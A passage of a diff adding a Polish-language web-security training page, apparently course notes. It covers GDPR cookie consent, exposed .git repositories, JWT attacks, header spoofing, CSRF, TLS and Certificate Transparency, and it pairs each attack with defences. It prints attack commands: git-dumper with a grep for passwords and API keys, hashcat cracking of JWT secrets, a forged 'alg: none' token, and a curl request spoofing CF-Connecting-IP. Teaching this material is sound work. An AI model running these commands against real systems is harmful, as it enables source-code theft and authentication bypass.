+                        <li>
+                            <code>SameSite</code> — kontroluje czy cookie jest
+                            wysylane przy zapytaniach z innej strony (szczegoly
+                            w sekcji CSRF)
+                        </li>
+                    </ul>
+                </div>
+            </details>
+
+            <details>
+                <summary>Co musi zawierac zgoda na cookies? (RODO)</summary>
+                <div class="content">
+                    <ul>
+                        <li>
+                            Zgoda musi byc <strong>swiadoma</strong> —
+                            uzytkownik musi wiedziec NA CO sie zgadza
+                        </li>
+                        <li>
+                            Musi byc <strong>dobrowolna</strong> — nie moze byc
+                            wymuszona (np. "zaakceptuj albo wyjdz")
+                        </li>
+                        <li>
+                            <strong>Informacja dla kogo</strong> dane sa
+                            zbierane — wymagana prawnie
+                        </li>
+                        <li>
+                            Bardzo wazne: musi byc podany
+                            <strong>CEL</strong> zbierania danych
+                        </li>
+                    </ul>
+                    <p>
+                        Narzedzie <strong>Rentgen</strong> (wtyczka do
+                        Firefoksa) skanuje strony pod katem trackerow i
+                        umozliwia zglaszanie naruszen RODO.
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>
+                    Dark patterns w bannerach cookies — czerwone flagi
+                </summary>
+                <div class="content">
+                    <p>
+                        Nielegalne (lub na granicy) praktyki, ktore spotykasz
+                        codziennie:
+                    </p>
+                    <ul>
+                        <li>
+                            <strong>"Akceptuj wszystko"</strong> duzy zielony
+                            przycisk, <strong>"Zarzadzaj"</strong> maly szary
+                            tekst — manipulacja wizualna
+                        </li>
+                        <li>
+                            <strong>Pre-zaznaczone checkboxy</strong> — RODO
+                            wymaga opt-in, nie opt-out
+                        </li>
+                        <li>
+                            <strong>"Cookie wall"</strong> — "zaakceptuj albo
+                            nie wchodzisz" — nielegalne wg EDPB (European Data
+                            Protection Board)
+                        </li>
+                        <li>
+                            <strong>Brak opcji odmowy</strong> — tylko
+                            "Akceptuj" i "Dowiedz sie wiecej" (ktore prowadzi do
+                            10-stronicowej polityki)
+                        </li>
+                        <li>
+                            <strong>"Legitimate interest"</strong> zamiast zgody
+                            — firmy omijaja wymog zgody twierdzac ze maja
+                            "uzasadniony interes". Czesto naduzywane.
+                        </li>
+                    </ul>
+                    <p>
+                        Kary: RODO pozwala na grzywny do
+                        <strong>4% rocznego obrotu</strong> lub
+                        <strong>20 mln EUR</strong> (to, co wyzsze). Np. Meta
+                        dostala 1.2 mld EUR kary w 2023.
+                    </p>
+                </div>
+            </details>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 9: .GIT -->
+        <!-- ============================================ -->
+        <h2 id="git">
+            <span class="emoji">📂</span> 9. .git — Wyciek kodu zrodlowego
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    Jesli folder <code>.git</code> jest dostepny publicznie na
+                    serwerze — atakujacy moze
+                    <strong>sklonowac cale repozytorium</strong>, w tym hasla,
+                    klucze API, sekrety. Nawet jesli serwer zwraca 403 — sa
+                    sposoby na obejscie.
+                </p>
+            </div>
+
+            <div class="anecdote">
+                <div class="anecdote-label">Demo ze szkolenia</div>
+                <p>Prowadzacy pokazal:</p>
+                <pre><code># Sprawdzenie czy .git jest dostepny:
+https://demo.kuba-orlik.name/.git/refs/heads/master
+# Jezeli zwraca tresc — mamy hash commitow!
+
+# Klonowanie repozytorium za pomoca git-dumper:
+pipx install git-dumper
+git-dumper https://demo.kuba-orlik.name/.git/ ./output_dir
+
+# Po pobraniu:
+cd output_dir
+git log                    # historia commitow
+git diff HEAD~5..HEAD      # co sie zmienilo
+grep -r "password\|secret\|api_key" .   # szukaj sekretow!</code></pre>
+            </div>
+
+            <details>
+                <summary>Co jesli .git zwraca FORBIDDEN (403)?</summary>
+                <div class="content">
+                    <p>
+                        Nawet jesli listowanie katalogu jest zablokowane,
+                        poszczegolne pliki moga byc nadal dostepne. Narzedzia
+                        takie jak <strong>git-dumper</strong> potrafia odbudowac
+                        repozytorium z poszczegolnych plikow
+                        (<code>.git/HEAD</code>, <code>.git/objects/</code>,
+                        etc.).
+                    </p>
+                    <p>
+                        Mozna tez uzyc <strong>DotGit</strong> — rozszerzenie
+                        przegladarki, ktore automatycznie wykrywa odsłoniete
+                        katalogi <code>.git</code>, <code>.svn</code>,
+                        <code>.env</code> na odwiedzanych stronach.
+                    </p>
+                </div>
+            </details>
+
+            <div class="warn">
+                <div class="warn-label">Co szukac w repozytorium</div>
+                <p>
+                    Jak zapisano w notatkach: "log… any secret" — po sklonowaniu
+                    przegladaj <strong>cala historie commitow</strong>, nie
+                    tylko najnowszy stan. Sekrety czesto sa "usuwane" w nowszych
+                    commitach, ale nadal widoczne w historii!
+                </p>
+            </div>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 10: JWT -->
+        <!-- ============================================ -->
+        <h2 id="jwt"><span class="emoji">🎫</span> 10. JWT — JSON Web Token</h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    JWT to "dowod osobisty" w swiecie webowym. Ma 3 czesci:
+                    <strong>naglowek</strong> (algorytm),
+                    <strong>payload</strong> (dane),
+                    <strong>podpis</strong> (weryfikacja). Problem: jesli klucz
+                    podpisu jest slaby, mozna go zlamac. Jesli algorytm jest zle
+                    skonfigurowany — mozna podpisac token samemu.
+                </p>
+            </div>
+
+            <h3>Struktura JWT</h3>
+            <pre><code># JWT sklada sie z 3 czesci oddzielonych kropkami:
+# HEADER.PAYLOAD.SIGNATURE
+
+# Przyklad:
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjN9.sIGnature
+
+# Kazda czesc to Base64URL encoded:
+# Header:  {"alg": "HS256"}
+# Payload: {"user_id": 123}
+# Signature: HMAC-SHA256(header + "." + payload, secret_key)</code></pre>
+
+            <details>
+                <summary>Ataki na JWT — co pokazano na szkoleniu</summary>
+                <div class="content">
+                    <h3>Atak 1: Zmiana danych w payload</h3>
+                    <p>
+                        Jak zapisano w notatkach: "printf [token ktory chcial
+                        namieszac]" — atakujacy moze zdekodowac payload
+                        (Base64), zmienic np. <code>user_id</code> lub
+                        <code>role</code>, i zakodowac ponownie.
+                    </p>
+                    <pre><code># Dekodowanie JWT:
+echo "eyJ1c2VyX2lkIjoxMjN9" | base64 -d
+# Wynik: {"user_id":123}
+
+# Zmiana danych:
+echo -n '{"user_id":456,"role":"admin"}' | base64
+# Wynik: eyJ1c2VyX2lkIjo0NTYsInJvbGUiOiJhZG1pbiJ9
+
+# Ale bez waznego podpisu — serwer powinien odrzucic!</code></pre>
+
+                    <p>
+                        <strong>Problem:</strong> jesli serwer nie weryfikuje
+                        podpisu (albo akceptuje <code>"alg": "none"</code>) —
+                        atak dziala. Jak zapisano: "bez kryptografii stosowanej
+                        to latwiejsze".
+                    </p>
+
+                    <h3>Atak 2: Lamanie klucza — Hashcat</h3>
+                    <pre><code># Hashcat z trybem 16500 (JWT):
+hashcat -m 16500 jwt_token.txt wordlist.txt
+
+# Brute-force krotkich sekretow:
+hashcat -m 16500 jwt_token.txt -a 3 '?l?l?l?l?l?l'
+# ?l = mala litera, proba 6-znakowych hasel</code></pre>
+                    <p>
+                        Im krotszy sekret -> tym latwiejszy wyciek. Jak
+                        zapisano: "Im mniej znakow tym latwiejszy wyciek, nie sa
+                        usuwane".
+                    </p>
+
+                    <h3>Atak 3: CVE-2018-0114 (node-jose)</h3>
+                    <p>
+                        Podatnosc w bibliotece <code>node-jose</code> (Cisco):
+                        atakujacy mogl
+                        <strong
+                            >dorzucic wlasny klucz publiczny do naglowka
+                            JWT</strong
+                        >, podpisac token swoim kluczem prywatnym, a serwer
+                        akceptowal to jako prawidlowe!
+                    </p>
+                    <p>
+                        Problem: klucze prywatne/publiczne (private/pub) —
+                        serwer mogl weryfikowac podpis kluczem z samego tokena,
+                        zamiast swoim wlasnym.
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>JWT vs Sesje — kiedy uzywac czego?</summary>
+                <div class="content">
+                    <p>
+                        Jak zapisano w notatkach: "session — age with extra
+                        steps" i "Sens: mikroserwisy komunikacja miedzy nimi —
+                        wtedy uzywac".
+                    </p>
+                    <ul>
+                        <li>
+                            <strong>Sesje (cookies)</strong>: stan na serwerze,
+                            prostsze, bezpieczniejsze dla typowych aplikacji
+                        </li>
+                        <li>
+                            <strong>JWT</strong>: bezstanowe (stateless),
+                            idealne do <strong>mikroserwisow</strong>, gdzie
+                            wiele uslug musi zweryfikowac tozsamosc bez
+                            komunikacji z jednym serwerem sesji
+                        </li>
+                        <li>
+                            JWT nie jest "lepsza sesja" — to inne narzedzie do
+                            innego problemu
+                        </li>
+                    </ul>
+                    <p>
+                        <strong>Wazne:</strong> jesli nie potrzebujesz
+                        mikroserwisow — tradycyjne sesje sa zazwyczaj
+                        bezpieczniejsze i prostsze.
+                    </p>
+                    <p>
+                        Wspomniano tez
+                        <a href="https://www.keycloak.org" target="_blank"
+                            >Keycloak</a
+                        >
+                        — open-source'owy serwer IAM (Identity and Access
+                        Management), ktory zarzadza tokenami JWT, sesjami, SSO i
+                        wiele wiecej.
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>Atak "alg: none" — najglupszy blad w JWT</summary>
+                <div class="content">
+                    <p>
+                        Specyfikacja JWT pozwala na algorytm
+                        <code>"none"</code> — token bez podpisu. Byl uzywany do
+                        komunikacji wewnetrznej miedzy zaufanymi serwisami.
+                    </p>
+                    <pre><code>// Normalny naglowek JWT:
+{"alg": "HS256", "typ": "JWT"}
+
+// Atak — zmiana na "none":
+{"alg": "none", "typ": "JWT"}
+
+// Token bez podpisu (trzecia czesc pusta):
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+// Jesli serwer akceptuje alg:none — masz pelna kontrole nad payload!</code></pre>
+                    <p>
+                        <strong>Obrona:</strong> <strong>NIGDY</strong> nie
+                        akceptuj <code>"alg": "none"</code> w produkcji.
+                        Biblioteki JWT powinny to blokowac domyslnie (wiele juz
+                        blokuje).
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>
+                    Atak "HS256 vs RS256 confusion" — zamiana algorytmu
+                </summary>
+                <div class="content">
+                    <p>Kolejny klasyczny atak na JWT:</p>
+                    <ul>
+                        <li>
+                            <strong>RS256</strong> = asymetryczny: serwer
+                            podpisuje kluczem <strong>prywatnym</strong>,
+                            weryfikuje kluczem <strong>publicznym</strong>
+                        </li>
+                        <li>
+                            <strong>HS256</strong> = symetryczny: ten sam
+                            <strong>sekret</strong> do podpisu i weryfikacji
+                        </li>
+                    </ul>
+                    <p>
+                        <strong>Atak:</strong> atakujacy zmienia naglowek z
+                        <code>"alg": "RS256"</code> na
+                        <code>"alg": "HS256"</code>, a nastepnie podpisuje token
+                        <strong>kluczem publicznym serwera</strong> (ktory jest…
+                        publiczny!). Serwer uzywa tego samego klucza publicznego
+                        do weryfikacji — i akceptuje token!
+                    </p>
+                    <pre><code># Pseudokod ataku:
+# 1. Pobierz klucz publiczny serwera (czesto dostepny np. na /.well-known/jwks.json)
+# 2. Zmien header: {"alg": "HS256"}
+# 3. Zmien payload: {"role": "admin"}
+# 4. Podpisz HMAC-SHA256 z kluczem publicznym jako sekret
+# 5. Serwer weryfikuje HS256 uzywajac klucza publicznego → PASUJE!</code></pre>
+                    <p>
+                        <strong>Obrona:</strong> serwer musi
+                        <strong>wymuszac oczekiwany algorytm</strong>, nie ufac
+                        naglowkowi <code>alg</code> z tokena.
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>JWT best practices — jak uzywac bezpiecznie</summary>
+                <div class="content">
+                    <ul>
+                        <li>
+                            <strong
+                                >Wymuszaj algorytm po stronie serwera</strong
+                            >
+                            — nie ufaj polu <code>alg</code> z tokena
+                        </li>
+                        <li>
+                            <strong>Uzywaj dlugich sekretow</strong> (min. 256
+                            bitow / 32 znaki dla HS256) — krotkie sekrety mozna
+                            zlamac Hashcatem w minuty
+                        </li>
+                        <li>
+                            <strong
+                                >Ustawiaj <code>exp</code> (expiration)</strong
+                            >
+                            — krótki czas zycia tokena (np. 15 minut dla access
+                            token)
+                        </li>
+                        <li>
+                            <strong
+                                >Nie przechowuj wrazliwych danych w
+                                payload</strong
+                            >
+                            — payload jest tylko zakodowany (Base64), NIE
+                            zaszyfrowany. Kazdy moze go odczytac!
+                        </li>
+                        <li>
+                            <strong
+                                >Uzywaj JWS (podpisane), nie JWE
+                                (zaszyfrowane)</strong
+                            >
+                            — chyba ze naprawde potrzebujesz szyfrowania payload
+                        </li>
+                        <li>
+                            <strong>Refresh tokens</strong> — access token
+                            krotki (15 min), refresh token dluzszy (7 dni),
+                            przechowywany bezpiecznie (HttpOnly cookie)
+                        </li>
+                        <li>
+                            <strong>Blacklisting/revocation</strong> — mechanizm
+                            uniewaznianiatokenow (np. przy wylogowaniu). JWT sa
+                            bezstanowe, wiec potrzebujesz listy uniewaznionch
+                            tokenow.
+                        </li>
+                    </ul>
+                </div>
+            </details>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 11: HEADERS -->
+        <!-- ============================================ -->
+        <h2 id="headers">
+            <span class="emoji">📡</span> 11. Naglowki HTTP — CF-Connecting-IP i
+            spoofing
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    Jesli Twoja aplikacja ufa naglowkowi
+                    <code>CF-Connecting-IP</code> (od Cloudflare) bez
+                    sprawdzenia, czy ruch naprawde przeszedl przez Cloudflare —
+                    atakujacy moze podszywac sie pod dowolne IP, w tym
+                    <code>localhost</code>!
+                </p>
+            </div>
+
+            <details>
+                <summary>Scenariusz ataku z CF-Connecting-IP</summary>
+                <div class="content">
+                    <p>
+                        Cloudflare dziala jako reverse proxy. Ruch: Uzytkownik →
+                        Cloudflare → Twoj serwer (port 80/443).
+                    </p>
+                    <p>
+                        <code>CF-Connecting-IP</code> to naglowek dodawany przez
+                        Cloudflare z prawdziwym IP uzytkownika. Serwer SSL
+                        terminuje na Cloudflare, a polaczenie do Twojego serwera
+                        moze byc na porcie 80.
+                    </p>
+
+                    <p>
+                        <strong>Problem:</strong> Jesli atakujacy polaczy sie
+                        <strong>bezposrednio</strong> z Twoim serwerem (omijajac
+                        Cloudflare), moze dodac ten naglowek sam:
+                    </p>
+                    <pre><code># Atakujacy wysyla zapytanie bezposrednio do serwera:
+curl -H "CF-Connecting-IP: 127.0.0.1" https://twoj-serwer.pl/admin
+
+# Serwer mysli ze request przychodzi z localhost!
+# Jesli admin panel jest dostepny tylko z localhost — mamy dostep!</code></pre>
+
+                    <p>
+                        <strong>Scenariusz ze szkolenia:</strong> Atakujacy jest
+                        w poblizu (np. w tej samej sieci, wspolny dostawca).
+                        Ustawia podrobiony naglowek IP. Serwer sprawdza tylko
+                        naglowek, nie weryfikuje czy ruch przeszedl przez
+                        Cloudflare — i wpuszcza go.
+                    </p>
+
+                    <p><strong>Jak sie bronic:</strong></p>
+                    <ul>
+                        <li>
+                            Akceptuj ruch <strong>TYLKO</strong> z IP Cloudflare
+                            (publikuja liste:
+                            <a
+                                href="https://www.cloudflare.com/ips/"
+                                target="_blank"
+                                >cloudflare.com/ips</a
+                            >)
+                        </li>
+                        <li>
+                            Uzyj
+                            <strong>Authenticated Origin Pulls</strong>
+                            (certyfikat klienta)
+                        </li>
+                        <li>
+                            Nigdy nie ufaj naglowkowi
+                            <code>CF-Connecting-IP</code> bezwarunkowo
+                        </li>
+                    </ul>
+                </div>
+            </details>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 12: CSRF -->
+        <!-- ============================================ -->
+        <h2 id="csrf">
+            <span class="emoji">🎭</span> 12. CSRF — Cross-Site Request Forgery
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    CSRF to atak, w ktorym ofiara klika link na stronie
+                    atakujacego, a przegladarka automatycznie dolacza ciasteczka
+                    sesji i wykonuje akcje na innej stronie — np. przelew w
+                    banku. Obrona: atrybut <strong>SameSite</strong> na cookies.
+                </p>
+            </div>
+
+            <div class="anecdote">
+                <div class="anecdote-label">Scenariusz ze szkolenia</div>
+                <p>
+                    Przykład: strona <code>zielone.pl</code> i
+                    <code>czerwone.pl</code>. Admin jest zalogowany na
+                    <code>zielone.pl</code>. Ktos robi mu psikusa i nakłania go
+                    do klikniecia linku na <code>czerwone.pl</code>, ktory w tle
+                    wykonuje akcje na <code>zielone.pl</code> jakąś technika
+                    (np. ukryta ramka/formularz).
+                </p>
+                <p>
+                    Jak zapisano: "kliknel link. XSS: same-origin. Strict" —
+                    prowadzacy tłumaczył roznice miedzy polityka same-origin a
+                    atrybutem SameSite cookies.
+                </p>
+            </div>
+
+            <details>
+                <summary>SameSite cookies — obrona przed CSRF</summary>
+                <div class="content">
+                    <p>
+                        Atrybut <code>SameSite</code> na ciasteczku kontroluje,
+                        czy przegladarka wyśle cookie przy zapytaniach
+                        cross-site:
+                    </p>
+                    <ul>
+                        <li>
+                            <code>SameSite=Strict</code> — cookie
+                            <strong>nigdy</strong> nie jest wysylane przy
+                            zapytaniach z innej strony. Najlepsza obrona, ale
+                            moze byc niewygodna (np. link z e-maila nie zaloguje
+                            Cie automatycznie).
+                        </li>
+                        <li>
+                            <code>SameSite=Lax</code> — cookie wysylane tylko
+                            przy nawigacji top-level (klikniecie linka), ale NIE
+                            przy POST/iframe/fetch.
+                            <strong>Domyslne od 2020</strong> w wiekszosci
+                            przegladarek.
+                        </li>
+                        <li>
+                            <code>SameSite=None</code> — cookie wysylane zawsze
+                            (wymaga <code>Secure</code>). Uzywane przy
+                            cross-site, ale otwiera na CSRF.
+                        </li>
+                    </ul>
+                    <pre><code># Ustawienie w nagłówku HTTP:
+Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly</code></pre>
+                    <p>
+                        Jak zapisano w notatkach: "na STRICT to default" — od
+                        2020 roku <code>SameSite=Lax</code> jest domyslna
+                        wartoscia (nie Strict). Wczesniej domyslnie bylo
+                        <code>None</code>.
+                    </p>
+
+                    <p><strong>Dodatkowe zabezpieczenia:</strong></p>
+                    <ul>
+                        <li>
+                            <strong>CSRF Token</strong> — jednorazowy token w
+                            formularzu, weryfikowany po stronie serwera
+                        </li>
+                        <li>
+                            <strong
+                                >Cross-Origin Resource Sharing (CORS)</strong
+                            >
+                            — kontrola jakie domeny moga wysylac zapytania
+                        </li>
+                    </ul>
+                </div>
+            </details>
+
+            <div class="warn">
+                <div class="warn-label">Korekta z notatek</div>
+                <p>
+                    W notatkach zapisano "Cross-site forgery" — pelna nazwa to
+                    <strong>Cross-Site Request Forgery (CSRF)</strong>. Czasem
+                    nazywany tez XSRF. Wdrozenie obrony: tokeny CSRF + SameSite
+                    cookies + sprawdzanie naglowka Referer/Origin.
+                </p>
+            </div>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 13: CRYPTO FAILURES -->
+        <!-- ============================================ -->
+        <h2 id="crypto">
+            <span class="emoji">🔐</span> 13. Cryptographic Failures i TLS
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    TLS/SSL chroni dane w transporcie. HTTP/2 jest szybszy
+                    (multipleksowanie — wiele zasobow na 1 polaczeniu). HSTS
+                    wymusza HTTPS. Zawsze testuj konfiguracje na
+                    <strong>SSL Labs</strong>.
+                </p>
+            </div>
+
+            <details>
+                <summary>HTTP/2 — dlaczego jest lepszy?</summary>
+                <div class="content">
+                    <p>
+                        Jak zapisano w notatkach: "http2 multipleksowanie (100
+                        tytan na 1 handshake; duza ilosc danych z tego samego
+                        origin, trójne tcp, wieksza latency)":
+                    </p>
+                    <ul>
+                        <li>
+                            <strong>Multipleksowanie</strong>: wiele
+                            zapytan/odpowiedzi na jednym polaczeniu TCP (zamiast
+                            otwierania nowych)
+                        </li>
+                        <li>
+                            <strong>1 handshake TLS</strong>: zamiast
+                            powtarzania handshake dla kazdego zasobu
+                        </li>
+                        <li>
+                            <strong>Mniejsza latencja</strong>: "trojne tcp"
+                            odnosi sie do TCP three-way handshake — w HTTP/1.1
+                            musisz go robic wielokrotnie, w HTTP/2 raz
+                        </li>
+                        <li>
+                            Szyfrowanie (<strong>TLS</strong>) jest praktycznie
+                            wymagane — wiekszosc przegladarek wspiera HTTP/2
+                            tylko po HTTPS
+                        </li>
+                    </ul>
+                </div>
+            </details>
+
+            <details>
+                <summary>HSTS — wymuszanie HTTPS</summary>
+                <div class="content">
+                    <p>
+                        <strong>HTTP Strict Transport Security</strong> —
+                        naglowek mowiacy przegladarce: "od teraz ZAWSZE lacz sie
+                        ze mna po HTTPS".
+                    </p>
+                    <pre><code># Konfiguracja w Nginx:
+add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+
+# W odpowiedzi HTTP:
+Strict-Transport-Security: max-age=31536000; includeSubDomains</code></pre>
+                    <p>
+                        Chroni przed atakami typu SSL Stripping (gdzie atakujacy
+                        podmienia HTTPS na HTTP "w locie").
+                    </p>
+                    <p>
+                        Jak zapisano: "Hsts na osobne, watek, dns" — HSTS moze
+                        byc tez wdrozony na poziomie DNS (HSTS Preload List), co
+                        chroni nawet przed pierwszym polaczeniem.
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>SSL Labs — testowanie konfiguracji</summary>
+                <div class="content">
+                    <p>
+                        <a
+                            href="https://www.ssllabs.com/ssltest/"
+                            target="_blank"
+                            >SSL Labs (ssllabs.com)</a
+                        >
+                        — darmowe narzedzie Qualys do testowania konfiguracji
+                        TLS serwera:
+                    </p>
+                    <ul>
+                        <li>
+                            Sprawdza wersje TLS (1.0, 1.1 — stare i
+                            niebezpieczne; 1.2, 1.3 — OK)
+                        </li>
+                        <li>Sprawdza cipher suites (zestawy szyfrowania)</li>
+                        <li>Ocenia konfiguracje (A+ to najlepsza ocena)</li>
+                        <li>Weryfikuje lancuch certyfikatow</li>
+                    </ul>
+                    <p>
+                        Jak zapisano: "Wersje, y Cipher, status, format
+                        nawzajem, najsilniejszy" — SSL Labs testuje wszystkie
+                        wspierane wersje protokolu i cipher suites, preferujac
+                        najmocniejsze.
+                    </p>
+
+                    <p>
+                        <strong>ssl-config.mozilla.org</strong> — generator
+                        konfiguracji TLS dla Nginx, Apache, HAProxy itd. Jak
+                        zapisano: "kopiuj wklej nginx" — wygeneruj konfiguracje
+                        i wklej do serwera.
+                    </p>
+                </div>
+            </details>
+
+            <details>
+                <summary>TLS 1.2 vs TLS 1.3 — co sie zmienilo?</summary>
+                <div class="content">
+                    <p>
+                        <strong>TLS 1.2</strong> (2008) vs
+                        <strong>TLS 1.3</strong> (2018) — kluczowe roznice:
+                    </p>
+                    <ul>
+                        <li>
+                            <strong>Szybkosc</strong>: TLS 1.2 = 2 round-tripy
+                            (2-RTT) na handshake. TLS 1.3 =
+                            <strong>1 round-trip</strong> (1-RTT), a przy
+                            ponownym polaczeniu nawet 0-RTT!
+                        </li>
+                        <li>
+                            <strong>Cipher suites</strong>: TLS 1.3
+                            <strong>usunol wszystkie slabe algorytmy</strong> —
+                            zostaly tylko 5 bezpiecznych. TLS 1.2 wspiera ~37, z
+                            czego wiele jest slabych.
+                        </li>
+                        <li>
+                            <strong>Perfect Forward Secrecy</strong>: w TLS 1.3
+                            jest <strong>wymagane</strong>. W TLS 1.2 —
+                            opcjonalne (i czesto nieuzywane).
+                        </li>
+                        <li>
+                            <strong>Szyfrowanie handshake'a</strong>: w TLS 1.3
+                            nawet certyfikat serwera jest szyfrowany podczas
+                            handshake (privacy!)
+                        </li>
+                    </ul>
+                    <pre><code># Dozwolone cipher suites w TLS 1.3 (WSZYSTKIE):
+TLS_AES_256_GCM_SHA384
+TLS_CHACHA20_POLY1305_SHA256
+TLS_AES_128_GCM_SHA256
+TLS_AES_128_CCM_SHA256
+TLS_AES_128_CCM_8_SHA256
+
+# Dla porownania — slabe cipher suites w TLS 1.2 (WYLACZYC!):
+TLS_RSA_WITH_RC4_128_SHA          # RC4 zlamany
+TLS_RSA_WITH_3DES_EDE_CBC_SHA     # 3DES slaby
+TLS_RSA_WITH_AES_128_CBC_SHA      # brak PFS (RSA key exchange)</code></pre>
+                </div>
+            </details>
+
+            <details>
+                <summary>Cipher Suite — co to jest i jak czytac nazwe?</summary>
+                <div class="content">
+                    <p>
+                        <span class="key-term">Cipher suite</span> to "zestaw
+                        algorytmow" uzywanych w polaczeniu TLS. Nazwa cipher
+                        suite mowi dokladnie co jest uzywane:
+                    </p>
+                    <pre><code>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+│     │      │        │    │    │
+│     │      │        │    │    └─ hash (integralnosc)
+│     │      │        │    └─ tryb (GCM = authenticated)
+│     │      │        └─ szyfrowanie (AES 256-bit)
+│     │      └─ uwierzytelnianie serwera (RSA)
+│     └─ wymiana kluczy (ECDHE = Elliptic Curve Diffie-Hellman Ephemeral)
+└─ protokol</code></pre>
+                    <p><strong>Na co zwracac uwage:</strong></p>
+                    <ul>
+                        <li>
+                            Wymiana kluczy: <code>ECDHE</code> lub
+                            <code>DHE</code> = dobry (ma PFS).
+                            <code>RSA</code> = zly (brak PFS!)
+                        </li>
+                        <li>
+                            Szyfrowanie: <code>AES-GCM</code> lub
+                            <code>CHACHA20</code> = dobry. <code>RC4</code>,
+                            <code>3DES</code>, <code>CBC</code> = zly
+                        </li>
+                        <li>
+                            Hash: <code>SHA256</code>/<code>SHA384</code> = OK.
+                            <code>SHA1</code>, <code>MD5</code> = zly
+                        </li>
+                    </ul>
+                </div>
+            </details>
+
+            <details>
+                <summary>
+                    Perfect Forward Secrecy (PFS) — dlaczego jest kluczowe?
+                </summary>
+                <div class="content">
+                    <p>
+                        <strong>Scenariusz bez PFS:</strong> atakujacy nagrywa
+                        zaszyfrowany ruch (latami). Kiedys zdobywa klucz
+                        prywatny serwera (wlam, nakaz sadowy, wyciek). Teraz
+                        moze
+                        <strong>odszyfrować CALY nagrany ruch wstecz</strong>!
+                    </p>
+                    <p>
+                        <strong>Z PFS (Ephemeral keys):</strong> kazda sesja
+                        uzywa <strong>jednorazowego klucza</strong>, ktory jest
+                        niszczony po zakonczeniu. Nawet zdobycie klucza
+                        prywatnego serwera nie pozwala odszyfrować starych
+                        sesji.
+                    </p>
+                    <pre><code># Sprawdz czy serwer uzywa PFS:
+# Na SSL Labs szukaj cipher suites z "ECDHE" lub "DHE"
+# Jesli widzisz tylko "RSA" w wymianie kluczy — BRAK PFS!
+
+# Wymus PFS w Nginx:
+ssl_ciphers 'ECDHE+AESGCM:ECDHE+CHACHA20';
+ssl_prefer_server_ciphers on;</code></pre>
+                </div>
+            </details>
+
+            <details>
+                <summary>TLS Handshake — krok po kroku</summary>
+                <div class="content">
+                    <p><strong>TLS 1.3 handshake (uproszczony):</strong></p>
+                    <pre><code>Klient                              Serwer
+  │                                    │
+  │─── ClientHello ──────────────────→│  (wersja TLS, cipher suites,
+  │    + key_share (klucz DH)         │   losowy nonce)
+  │                                    │
+  │←── ServerHello ───────────────────│  (wybrany cipher, klucz DH)
+  │    + EncryptedExtensions          │
+  │    + Certificate                  │  (certyfikat serwera)
+  │    + CertificateVerify            │  (podpis)
+  │    + Finished                     │
+  │                                    │
+  │─── Finished ──────────────────────→│
+  │                                    │
+  │←────── szyfrowane dane ──────────→│  GOTOWE! (1 round-trip)</code></pre>
+                    <p>
+                        Porownanie: TLS 1.2 wymaga 2 round-tripow, bo wymiana
+                        kluczy i certyfikat ida osobno. TLS 1.3 laczy to w jeden
+                        krok.
+                    </p>
+                </div>
+            </details>
+
+            <div class="warn">
+                <div class="warn-label">
+                    Uwaga — wsparcie TLS zalezy od platformy
+                </div>
+                <p>
+                    <strong
+                        >TLS 1.3 nie jest wspierany na Android 10 i
+                        starszych.</strong
+                    >
+                    Wsparcie TLS rozni sie w zaleznosci od platformy (system
+                    operacyjny, przegladarka, biblioteka). Przy konfiguracji
+                    serwera trzeba zdecydowac: czy wylaczyc stare wersje TLS
+                    (1.0, 1.1) dla bezpieczenstwa, kosztem utraty
+                    kompatybilnosci ze starszymi urzadzeniami? SSL Labs pokazuje
+                    dokladnie, ktore platformy nie polacza sie z Twoim serwerem
+                    przy danej konfiguracji.
+                </p>
+            </div>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- SECTION 14: DNS -->
+        <!-- ============================================ -->
+        <h2 id="dns">
+            <span class="emoji">🌐</span> 14. DNS — Domain Squatting i
+            Certificate Transparency
+        </h2>
+
+        <div class="section">
+            <div class="tldr">
+                <div class="tldr-label">TL;DR</div>
+                <p>
+                    Atakujacy rejestruja domeny podobne do Twojej (literowki,
+                    zamiana liter) — to <strong>typosquatting</strong>.
+                    <strong>Certificate Transparency</strong> pozwala zobaczyc
+                    wszystkie certyfikaty wystawione dla domeny (i odkryc
+                    subdomeny).
+                </p>
+            </div>
+
+            <h3>Certificate Transparency (CT)</h3>
+            <details>
+                <summary>crt.sh — wyszukiwanie certyfikatow i subdomen</summary>
+                <div class="content">
+                    <p>
+                        Kazdy certyfikat SSL wystawiony przez publiczny CA jest
+                        rejestrowany w logach Certificate Transparency. Strona
+                        <a href="https://crt.sh" target="_blank">crt.sh</a>
+                        pozwala je przeszukac:
+                    </p>
+                    <pre><code># Wyszukaj certyfikaty dla domeny:
+https://crt.sh/?q=example.com
+
+# Wyszukaj subdomeny (wildcard):
+https://crt.sh/?q=%25.example.com
+
+# Z wiersza polecen:
+curl -s "https://crt.sh/?q=%25.example.com&output=json" | \
+  jq -r '.[].name_value' | sort -u</code></pre>
+                    <p>
+                        Jak zapisano: "crt.sh lub mate, subdomeny wizualizacja"
+                        — crt.sh sluzy do odkrywania subdomen, ktore mogly byc
